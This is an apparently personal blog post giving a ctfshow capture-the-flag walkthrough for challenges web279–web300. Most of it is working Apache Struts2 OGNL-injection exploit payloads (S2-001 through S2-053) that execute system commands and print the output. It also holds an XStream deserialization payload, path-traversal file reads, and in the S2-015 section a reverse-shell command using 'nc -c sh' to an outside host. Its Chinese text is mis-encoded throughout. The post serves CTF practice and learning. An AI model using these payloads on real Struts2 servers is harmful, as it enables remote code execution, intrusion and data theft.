<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>[ctfshow]JAVA | fallingskies</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">


  
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
  

  


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="web279
Struts2æ¼æ´ S2-001
payload
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;env&quot;})).redirectErr..." />
    <meta name="keywords" content="" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://fallingskies22.github.io">
        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
        <h1 class="site-title">fallingskies</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            é¦–é¡µ
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            å½’æ¡£
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            æ ‡ç­¾
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            å…³äº
          </a>
        
      
        
          <a href="/post/friends" class="site-nav">
            å‹é“¾
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      <h3>æƒ³è¦å»æœˆçƒ<h3>
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">[ctfshow]JAVA</h2>
            <div class="post-date">2024-03-29</div>
            
              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowjava.png')">
              </div>
            
            <div class="post-content" v-pre>
              <h2 id="web279">web279</h2>
<p>Struts2æ¼æ´ S2-001</p>
<p>payload</p>
<pre><code class="language-java">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;env&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre>
<h2 id="web280">web280</h2>
<p>Struts2æ¼æ´ S2-005</p>
<p>è¿™ä¸ªæ¼æ´æ˜¯å¯¹S2-003çš„ç»•è¿‡</p>
<ol>
<li>ä½¿ç”¨unicodeç¼–ç (u0023)æˆ–8è¿›åˆ¶(43)ç»•è¿‡å¯¹#çš„é™åˆ¶ã€‚</li>
<li>å…³æ‰å®‰å…¨é…ç½®(allowStaticMethodAccessã€MethodAccessor.denyMethodExecutionç¦æ­¢é™æ€æ–¹æ³•è°ƒç”¨å’Œç±»æ–¹æ³•æ‰§è¡Œç­‰ï¼‰</li>
</ol>
<p>æ‰¾åˆ°ä¸€ä¸ª<a href="https://www.wevul.com/6420.html">GUIåˆ©ç”¨å·¥å…·</a></p>
<p>payload</p>
<pre><code class="language-java">('\43_memberAccess.allowStaticMethodAccess')(a)=true&amp;(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&amp;('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&amp;(g)(('\43mycmd\75\'env\'')(d))&amp;(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&amp;(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&amp;(j)(('\43myres\75new\40byte[51020]')(d))&amp;(k)(('\43mydat.readFully(\43myres)')(d))&amp;(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&amp;(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&amp;(n)(('\43myout.getWriter().println(\43mystr)')(d))
</code></pre>
<h2 id="web281">web281</h2>
<p>Struts2æ¼æ´ S2-007</p>
<p>åœ¨å¤„ç†ç±»å‹è½¬æ¢çš„é”™è¯¯æ—¶ä¼šå­˜å…¥é”™è¯¯åˆ°å†…å­˜ä¸­ï¼Œåœ¨åç»­è°ƒç”¨æµç¨‹ä¸­è§¦å‘OGNLè¡¨è¾¾å¼æ³¨å…¥ã€‚<br>
è¿™é‡Œageæ˜¾ç„¶æ˜¯intå‹ï¼Œä¼ å…¥payloadå¯å¯¼è‡´å‘½ä»¤æ‰§è¡Œã€‚</p>
<p>payload</p>
<pre><code class="language-java">' + (#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream())) + '
</code></pre>
<h2 id="web282">web282</h2>
<p>Struts2æ¼æ´ S2-008<br>
è¿™æ˜¯ä¸€ä¸ªå¤åˆæ¼æ´ï¼Œå®šä¹‰ä¸æ˜¯å¾ˆæ˜ç¡®ã€‚<a href="https://www.anquanke.com/post/id/261742">å‚è€ƒæ–‡ç« </a></p>
<p>devmode.actionå¤„å¼€å¯äº†å¼€å‘è€…æ¨¡å¼ï¼Œå¯ä»¥ç›´æ¥æ‰§è¡Œå‘½ä»¤ã€‚</p>
<p>payload</p>
<pre><code>debug=command&amp;expression=(#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#foo=new java.lang.Boolean(&quot;false&quot;) ,#context[&quot;xwork.MethodAccessor.denyMethodExecution&quot;]=#foo,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))
</code></pre>
<h2 id="web283">web283</h2>
<p>Struts2æ¼æ´ S2-009<br>
showcaseè¿œç¨‹ä»£ç æ‰§è¡Œ</p>
<p>æ­£åˆ™ç»•è¿‡ParametersIntercepter</p>
<p>payload</p>
<pre><code class="language-java">/ajax/example5.action?age=12313&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27ls%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[51020],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]
</code></pre>
<h2 id="web284">web284</h2>
<p>Struts2æ¼æ´ S2-012</p>
<p>redirecté‡å®šå‘å˜é‡</p>
<p>payload</p>
<pre><code class="language-java">%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{&quot;/bin/bash&quot;,&quot;-c&quot;, &quot;env&quot;})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
</code></pre>
<h2 id="web285">web285</h2>
<p>Struts2æ¼æ´ S2-013</p>
<p>&lt;s:a&gt;å’Œ&lt;s:url&gt;æ ‡ç­¾ä¸­includeParams=all</p>
<p>payload</p>
<pre><code class="language-java">?a=${#_memberAccess[&quot;allowStaticMethodAccess&quot;]=true,#a=@java.lang.Runtime@getRuntime().exec('id').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println('result='+new java.lang.String(#d)),#out.close()}
</code></pre>
<h2 id="web286">web286</h2>
<p>Struts2æ¼æ´ S2-015</p>
<p>é…ç½®äº† Action é€šé…ç¬¦ *ï¼Œå¹¶å°†å…¶ä½œä¸ºåŠ¨æ€å€¼æ—¶ï¼Œè§£ææ—¶ä¼šå°†å…¶å†…å®¹æ‰§è¡Œ OGNL è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="language-xml">&lt;package name=&quot;S2-015&quot; extends=&quot;struts-default&quot;&gt;
    &lt;action name=&quot;*&quot; class=&quot;com.demo.action.PageAction&quot;&gt;
        &lt;result&gt;/{1}.jsp&lt;/result&gt;
    &lt;/action&gt;
&lt;/package&gt;
</code></pre>
<p>payload</p>
<pre><code class="language-java">/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('nc -c sh ip 1337').getInputStream()),#q}.action
</code></pre>
<p>å›æ˜¾å­—æ•°æœ‰é™ï¼Œä¸”ä¸èƒ½è§£æç‰¹æ®Šå­—ç¬¦<code>/</code>ï¼Œè®°å¾—urlencode</p>
<p>ä½¿ç”¨åå¼¹shellçš„æ–¹å¼</p>
<h2 id="web287">web287</h2>
<p>Struts2æ¼æ´ S2-016</p>
<p>åœ¨struts2ä¸­ï¼ŒDefaultActionMapperç±»æ”¯æŒä»¥&quot;action:&quot;ã€â€œredirect:â€ã€&quot;redirectAction:&quot;ä½œä¸ºå¯¼èˆªæˆ–æ˜¯é‡å®šå‘å‰ç¼€ï¼Œä½†æ˜¯è¿™äº›å‰ç¼€åé¢åŒæ—¶å¯ä»¥è·ŸOGNLè¡¨è¾¾å¼ï¼Œç”±äºstruts2æ²¡æœ‰å¯¹è¿™äº›å‰ç¼€åšè¿‡æ»¤ï¼Œå¯¼è‡´åˆ©ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨javaé™æ€æ–¹æ³•æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>payload(éœ€è¦urlencode)</p>
<pre><code class="language-java">?redirect:${#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())}
</code></pre>
<h2 id="web288">web288</h2>
<p>Struts2æ¼æ´ S2-019</p>
<p>è¦æ±‚å¼€å‘è€…æ¨¡å¼ï¼Œä¸”pocç¬¬ä¸€ä¸ªå‚æ•°æ˜¯debugï¼Œè§¦å‘ç‚¹åœ¨DebuggingInterceptorä¸Šï¼ŒæŸ¥çœ‹interceptå‡½æ•°ï¼Œä»debugå‚æ•°è·å–è°ƒè¯•æ¨¡å¼ï¼Œå¦‚æœæ¨¡å¼æ˜¯commandï¼Œåˆ™æŠŠexpressionå‚æ•°æ”¾åˆ°stack.findValueä¸­ï¼Œæœ€ç»ˆæ”¾åˆ°äº†ognl.getValueä¸­ã€‚</p>
<p>payload(éœ€è¦urlencode)</p>
<pre><code class="language-java">?debug=command&amp;expression=#context['xwork.MethodAccessor.denyMethodExecution']=false,#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())
</code></pre>
<h2 id="web289">web289</h2>
<p>Struts2æ¼æ´ S2-029</p>
<p>Struts2çš„æ ‡ç­¾åº“ä½¿ç”¨OGNLè¡¨è¾¾å¼æ¥è®¿é—®ActionContextä¸­çš„å¯¹è±¡æ•°æ®ã€‚ä¸ºäº†èƒ½å¤Ÿè®¿é—®åˆ°ActionContextä¸­çš„å˜é‡ï¼ŒStruts2å°†ActionContextè®¾ç½®ä¸ºOGNLçš„ä¸Šä¸‹æ–‡ï¼Œå¹¶å°†OGNLçš„å¯¹è±¡åŠ å…¥ActionContextä¸­ã€‚<br>
åœ¨Struts2ä¸­ï¼Œå¦‚ä¸‹çš„æ ‡ç­¾å°±è°ƒç”¨äº†OGNLè¿›è¡Œå–å€¼</p>
<pre><code>&lt;p&gt;parameters: &lt;s:property value=&quot;#parameters.msg&quot; /&gt;&lt;/p&gt;
</code></pre>
<p>payload(éœ€è¦urlencode)</p>
<pre><code class="language-java">/default.action?message=(#_memberAccess['allowPrivateAccess']=true,#_memberAccess['allowProtectedAccess']=true,#_memberAccess['excludedPackageNamePatterns']=#_memberAccess['acceptProperties'],#_memberAccess['excludedClasses']=#_memberAccess['acceptProperties'],#_memberAccess['allowPackageProtectedAccess']=true,#_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))
</code></pre>
<h2 id="web290">web290</h2>
<p>Struts2æ¼æ´ S2-032</p>
<p>å½“å¯ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå¯ä»¥ä¼ é€’å¯ç”¨äºåœ¨æœåŠ¡å™¨ç«¯æ‰§è¡Œä»»æ„ä»£ç çš„æ¶æ„è¡¨è¾¾å¼ã€‚ ä½¿ç”¨method:Action å‰ç¼€å»è°ƒç”¨å£°æ˜ä¸º public çš„å‡½æ•°ï¼Œåªä¸è¿‡åœ¨ä½ç‰ˆæœ¬ä¸­ Strtus2 ä¸ä¼šå¯¹ name æ–¹æ³•å€¼åš OGNL è®¡ç®—ï¼Œè€Œåœ¨é«˜ç‰ˆæœ¬ä¸­ä¼šã€‚</p>
<p>payload(éœ€è¦urlencode)</p>
<pre><code class="language-java">?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#res=@org.apache.struts2.ServletActionContext@getResponse(),#res.setCharacterEncoding(#parameters.encoding[0]),#w=#res.getWriter(),#s=new java.util.Scanner(@java.lang.Runtime@getRuntime().exec(#parameters.cmd[0]).getInputStream()).useDelimiter(#parameters.pp[0]),#str=#s.hasNext()?#s.next():#parameters.ppp[0],#w.print(#str),#w.close(),1?#xx:#request.toString&amp;pp=\\A&amp;ppp= &amp;encoding=UTF-8&amp;cmd=env
</code></pre>
<h2 id="web291">web291</h2>
<p>Struts2æ¼æ´ S2-033</p>
<p>å½“å¯ç”¨åŠ¨æ€æ–¹æ³•è°ƒç”¨ä¹‹åï¼Œä½¿ç”¨äº†restæ’ä»¶å°±å¯èƒ½æ‰§è¡Œognlè¡¨è¾¾å¼å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>payload</p>
<pre><code class="language-java">/S2-033/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=env
</code></pre>
<h2 id="web292">web292</h2>
<p>Struts2æ¼æ´ S2-037</p>
<p>å’ŒS2-033ä¸€æ ·ï¼Œåªä¸è¿‡ä¸éœ€è¦å¼€å¯åŠ¨æ€æ–¹æ³•è°ƒç”¨ã€‚å…·ä½“<a href="https://blog.sari3l.com/posts/617314e9/">å‚è€ƒæ–‡ç« </a></p>
<h2 id="web293">web293</h2>
<p>Struts2æ¼æ´ S2-045</p>
<p>åœ¨ä½¿ç”¨åŸºäºJakartaæ’ä»¶çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œæœ‰å¯èƒ½å­˜åœ¨è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ¶æ„ç”¨æˆ·å¯åœ¨ä¸Šä¼ æ–‡ä»¶æ—¶é€šè¿‡ä¿®æ”¹HTTPè¯·æ±‚å¤´ä¸­çš„Contentâ€”Typeå€¼æ¥è§¦å‘è¯¥æ¼æ´ï¼Œè¿›è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p>
<p>payload</p>
<pre><code class="language-java">Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('env').getInputStream()))).(#ros.flush())}
</code></pre>
<h2 id="web294">web294</h2>
<p>Struts2æ¼æ´ S2-046</p>
<p>æ”»å‡»è€…é€šè¿‡è®¾ç½®Content-Dispositionçš„filenameå­—æ®µæˆ–è€…è®¾ç½®Content-Lengthè¶…è¿‡2Gè¿™ä¸¤ç§æ–¹å¼æ¥è§¦å‘å¼‚å¸¸å¹¶å¯¼è‡´filenameå­—æ®µçš„OGNLè¡¨è¾¾å¼å¾—åˆ°æ‰§è¡Œä»è€Œè¾¾åˆ°è¿œç¨‹æ”»å‡»çš„ç›®çš„ã€‚è¯¥æ¼æ´ä¸045æ¼æ´æˆå› ä¸€æ ·ï¼Œåªæ˜¯æ¼æ´åˆ©ç”¨çš„å­—æ®µå‘ç”Ÿäº†æ”¹å˜ã€‚<br>
ä¸045ç›¸åŒï¼Œ046ä¹Ÿæ˜¯OGNLæ³¨å…¥ï¼Œä½†å‡ºç°åœ¨ä¸Šä¼ è¯·æ±‚çš„æ–‡ä»¶åå­—æ®µä¸­ï¼Œå¹¶ä¸”éœ€è¦NULLå­—èŠ‚æ¥æ‹†åˆ†æœ‰æ•ˆè´Ÿè½½å’Œå…¶ä½™å­—ç¬¦ä¸²ã€‚</p>
<p>payload</p>
<pre><code class="language-java">filename=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b&quot;
//éœ€è¦å°†\x00æ›¿æ¢ä¸ºNULL
</code></pre>
<h2 id="web295">web295</h2>
<p>Struts2æ¼æ´ S2-048</p>
<p>Apache Struts2 2.3.x ç³»åˆ—å¯ç”¨äº†struts2-struts1-plugin æ’ä»¶å¹¶ä¸”å­˜åœ¨ struts2-showcase ç›®å½•,å…¶æ¼æ´æˆå› æ˜¯å½“ActionMessageæ¥æ”¶å®¢æˆ·å¯æ§çš„å‚æ•°æ•°æ®æ—¶ï¼Œç”±äºåç»­æ•°æ®æ‹¼æ¥ä¼ é€’åå¤„ç†ä¸å½“å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚</p>
<p>payload</p>
<pre><code>/S2-048/integration/saveGangster.action

name=%25%7b%28%23nike%3d%27multipart%2fform-data%27%29.%28%23dm%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3f%28%23_memberAccess%3d%23dm%29%3a%28%28%23container%3d%23context%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d%29.%28%23ognlUtil%3d%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3d%27env%27%29.%28%23iswin%3d%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3d%28%23iswin%3f%7b%27cmd.exe%27%2c%27%2fc%27%2c%23cmd%7d%3a%7b%27%2fbin%2fbash%27%2c%27-c%27%2c%23cmd%7d%29%29.%28%23p%3dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3d%23p.start%28%29%29.%28%23ros%3d%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2c%23ros%29%29.%28%23ros.flush%28%29%29%7d&amp;age=1&amp;__checkbox_bustedBefore=true&amp;description=1
</code></pre>
<h2 id="web296">web296</h2>
<p>Struts2æ¼æ´ S2-052</p>
<p>Struts2 RESTæ’ä»¶çš„XStreamç»„ä»¶å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿ç”¨XStreamç»„ä»¶å¯¹XMLæ ¼å¼çš„æ•°æ®åŒ…è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ï¼Œæœªå¯¹æ•°æ®å†…å®¹è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œå¯è¢«è¿œç¨‹æ”»å‡»ã€‚</p>
<p>è¿™é¢˜åˆ©ç”¨å¦‚ä¸‹payloadä¼šæŠ¥500,ä½¿ç”¨S2-046æ¼æ´è¿›è¡Œåˆ©ç”¨ï¼ˆç­‰æœ‰æ—¶é—´å†ç ”ç©¶ğŸ‘½ï¼‰</p>
<pre><code class="language-xml">&lt;map&gt;
 &lt;entry&gt;
 &lt;jdk.nashorn.internal.objects.NativeString&gt;
 &lt;flags&gt;0&lt;/flags&gt;
 &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
 &lt;dataHandler&gt;
 &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
 &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
 &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
 &lt;initialized&gt;false&lt;/initialized&gt;
 &lt;opmode&gt;0&lt;/opmode&gt;
 &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
 &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
 &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
 &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
 &lt;command&gt;
 &lt;string&gt;touch&lt;/string&gt;
 &lt;string&gt;/tmp/success&lt;/string&gt;
 &lt;/command&gt;
 &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
 &lt;/next&gt;
 &lt;/iter&gt;
 &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
 &lt;method&gt;
 &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
 &lt;name&gt;start&lt;/name&gt;
 &lt;parameter-types/&gt;
 &lt;/method&gt;
 &lt;name&gt;foo&lt;/name&gt;
 &lt;/filter&gt;
 &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
 &lt;/serviceIterator&gt;
 &lt;lock/&gt;
 &lt;/cipher&gt;
 &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
 &lt;ibuffer&gt;&lt;/ibuffer&gt;
 &lt;done&gt;false&lt;/done&gt;
 &lt;ostart&gt;0&lt;/ostart&gt;
 &lt;ofinish&gt;0&lt;/ofinish&gt;
 &lt;closed&gt;false&lt;/closed&gt;
 &lt;/is&gt;
 &lt;consumed&gt;false&lt;/consumed&gt;
 &lt;/dataSource&gt;
 &lt;transferFlavors/&gt;
 &lt;/dataHandler&gt;
 &lt;dataLen&gt;0&lt;/dataLen&gt;
 &lt;/value&gt;
 &lt;/jdk.nashorn.internal.objects.NativeString&gt;
 &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;
 &lt;/entry&gt;
 &lt;entry&gt;
 &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
 &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;
 &lt;/entry&gt;
&lt;/map&gt;
</code></pre>
<h2 id="web297">web297</h2>
<p>Struts2æ¼æ´ S2-053</p>
<p>Struts2åœ¨ä½¿ç”¨Freemarkeræ¨¡æ¿å¼•æ“çš„æ—¶å€™ï¼ŒåŒæ—¶å…è®¸è§£æOGNLè¡¨è¾¾å¼ã€‚å¯¼è‡´ç”¨æˆ·è¾“å…¥çš„æ•°æ®æœ¬èº«ä¸ä¼šè¢«OGNLè§£æï¼Œä½†ç”±äºè¢«Freemarkerè§£æä¸€æ¬¡ä¹‹åå˜æˆå¦ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¢«OGNLè§£æç¬¬äºŒæ¬¡ï¼Œå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</p>
<p>å›æ˜¾æœ‰å­—æ•°é™åˆ¶ï¼Œä½¿ç”¨è¾“å‡ºåˆ°æ–‡ä»¶çš„æ–¹å¼è¯»å–env<br>
payload</p>
<pre><code class="language-java">%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='env &gt;/usr/local/tomcat/webapps/S2-053/1.txt').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
</code></pre>
<h2 id="web298">web298</h2>
<p>é¢˜ç›®æä¾›äº†waråŒ…ï¼ŒwaråŒ…å®é™…ä¸Šæ˜¯zipæ ¼å¼çš„ï¼Œä¿®æ”¹åç¼€ä¸ºzipç„¶åè§£å‹ï¼Œå¯ä»¥çœ‹åˆ°index.jspæ–‡ä»¶ï¼Œä»¥åŠclassæ–‡ä»¶ï¼Œclassæ–‡ä»¶ç”¨jadxæ¥åç¼–è¯‘å³å¯çœ‹åˆ°æºç ã€‚<br>
æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼Œweb.xmlç”¨æ¥æ˜ å°„è·¯ç”±å’Œservelet<br>
<img src="https://fallingskies22.github.io/post-images/1712989415976.png" alt="" loading="lazy"></p>
<p>payload</p>
<pre><code>/ctfshow/login?username=admin&amp;password=ctfshow
</code></pre>
<h2 id="web299">web299</h2>
<p>é€šè¿‡æç¤ºçŸ¥é“å¯ä»¥ä»»æ„æ–‡ä»¶è¯»å–,å…ˆè¯»å–web.xmlæ–‡ä»¶è·å–æ˜ å°„</p>
<pre><code>/view-source?file=WEB-INF/web.xml
</code></pre>
<p>æŸ¥çœ‹åˆ°<code>/getFlag</code>æ˜ å°„åï¼Œè¯»å–ç›¸åº”classæ–‡ä»¶</p>
<pre><code>/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class
</code></pre>
<p>è¯»å–æ–‡ä»¶æ˜¯è¿›è¡Œè¿‡å¤„ç†çš„ï¼Œæ²¡æ³•åç¼–è¯‘ï¼Œå…·ä½“ç»†èŠ‚åˆ†ææœ‰ç‚¹å›°éš¾ã€‚<br>
ä»å¯è¯»å­—ç¬¦ä¸­å¤§æ¦‚èƒ½çœ‹å‡ºä¼šå°†å­—ç¬¦ä¸<code>/fl3g</code>æ¯”è¾ƒã€‚</p>
<pre><code>/view-source?file=../../../../../fl3g
</code></pre>
<h2 id="web300">web300</h2>
<p>å’Œä¸Šé¢˜payloadç›¸åŒ</p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p>https://www.freebuf.com/articles/web/280245.html</p>

            </div>
            
            
              <div class="next-post">
                <div class="next">ä¸‹ä¸€ç¯‡</div>
                <a href="https://fallingskies22.github.io/post/ctfshowphp-fan-xu-lie-hua/">
